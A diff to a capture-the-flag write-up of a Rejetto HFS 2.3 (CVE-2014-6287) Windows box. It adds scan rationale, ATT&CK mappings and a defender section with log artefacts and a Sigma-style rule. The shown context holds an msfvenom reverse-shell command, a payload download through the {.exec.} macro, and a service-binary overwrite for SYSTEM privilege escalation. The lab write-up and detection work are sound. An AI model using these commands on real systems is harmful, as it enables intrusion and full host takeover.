@@ -58,7 +58,24 @@ Expected exposed surface (confirm on completion):
 - Browse `:8080` and confirm the banner reads **"HttpFileServer 2.3"**. [Paste scan output on
   completion.]
 
+**nmap flag rationale:**
+- `-p-` — all 65,535 TCP ports. The HFS instance is on **8080**, not a standard web port; full-port
+  scanning is what surfaces it alongside the decoy IIS site on 80.
+- `-sV` — version detection. The decisive output is the banner **"HttpFileServer 2.3"** → maps
+  directly to CVE-2014-6287; the version string is the whole foothold.
+- `-sC` — default scripts; `http-title` and `http-server-header` confirm HFS vs IIS quickly.
+- `-oA nmap/steelmountain` — keep the banner evidence.
+
+**What to look for in the scan:** the exact string **"HttpFileServer 2.3"** (or "HFS 2.3") on the
+8080 banner — that single fact is the CVE-2014-6287 trigger. Also note the port-80 landing page
+whose image leaks an "employee of the month" name (a room hint, not the path). Confirm the version
+before anything else; everything downstream depends on it.
+
 ## 2. Exploitation (HFS 2.3 RCE)
+
+The foothold maps a banner to a known RCE: triggering the `{.exec.}` macro is **[ATT&CK T1190 —
+Exploit Public-Facing Application]**, and the downloaded payload executing is **[ATT&CK T1059 —
+Command and Scripting Interpreter]**.
 
 **Manual path (recommended for understanding):** host a Netcat binary and a payload over a Python
 web server, then trigger the `{.exec.}` macro to download and run it.
@@ -102,7 +119,8 @@ accesschk.exe -wuvc AdvancedSystemCareService9
 ```
 
 - Generate a replacement binary, overwrite the service executable, and restart the service so it
-  runs the payload as **SYSTEM**:
+  runs the payload as **SYSTEM** **[ATT&CK T1543.003 — Create or Modify System Process: Windows
+  Service; T1574.009 — Hijack Execution Flow: Unquoted/Trusted Path]**:
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<tun0 ip> LPORT=5555 -f exe -o ASCService.exe
@@ -145,7 +163,52 @@ sc start AdvancedSystemCareService9       # service runs as SYSTEM → payload f
   detect via service-binary modification and unexpected service restarts. Control: restrict write
   permissions on service binaries and quote all service paths.
 
-## 7. References
+## 7. Defender perspective — logs & detection
+
+What this attack looks like from a monitored SOC, and the rule that would catch it. (See
+[../methodology/ctf-methodology.md §7](../methodology/ctf-methodology.md).)
+
+**Log artefacts generated:**
+- **HFS / web logs:** a request to the search endpoint containing the URL-encoded `{.exec|...}`
+  macro — the literal `{.exec.}` string in a query is the exploit and never appears in normal use.
+- **Process telemetry (Sysmon ID 1):** `hfs.exe` spawning `cmd.exe`/`nc.exe`/`powershell.exe`
+  (the foothold), and later `services.exe` spawning the **replaced service binary** as SYSTEM (the
+  privesc). The parent→child anomaly is the signal in both stages.
+- **Service tampering (the strongest privesc signal):** Windows **System Event ID 7045** (a new
+  service installed) and/or **7040/7036** (service start-type/state change), plus the service
+  binary file being overwritten — Sysmon **Event ID 11 (FileCreate)** on the service's exe path,
+  outside any patch window.
+- **PowerUp/accesschk enumeration** itself spawns `powershell.exe` with suspicious reflection and
+  reads service ACLs — detectable via PowerShell **Script Block Logging (Event ID 4104)**.
+- **Network:** two reverse shells (user, then SYSTEM) outbound from the host.
+
+**Example detection logic (Sigma-style):**
+```yaml
+title: Rejetto HFS RCE + insecure-service privesc
+detection:
+  rce:
+    Image|endswith: '\hfs.exe'      # as ParentImage spawning a shell
+    ChildImage|endswith: ['\cmd.exe', '\nc.exe', '\powershell.exe']
+  service_tamper:
+    EventID: [7045, 7040]           # new / modified service
+  bin_overwrite:
+    EventID: 11                     # Sysmon FileCreate on a service exe path
+  condition: rce OR (service_tamper AND bin_overwrite)
+level: critical
+```
+
+**Why it fires:** the `{.exec.}` string is unambiguously malicious in a URL, and a service binary
+being overwritten then restarted (7045/7040 + FileCreate on the exe) is the textbook insecure-
+service privesc — there is no legitimate workflow that rewrites a running service's executable from
+a user context. Web log catches *delivery*, Event 7045 catches *escalation*. Maps to **ATT&CK
+T1190 / T1059 / T1543.003 / T1574.009**.
+
+**Defensive controls:** patch/replace Rejetto HFS; restrict write permissions on all service
+binaries and their parent directories; quote all service paths; run web apps as low-privilege
+accounts; alert on Event 7045 and on service-binary file modifications.
+
+## 8. References
 
 - Rejetto HFS 2.3 CVE-2014-6287 (verify before citing).
 - PowerSploit / PowerUp documentation; unquoted-service-path guidance.
+- MITRE ATT&CK T1190, T1059, T1543.003, T1574.009.
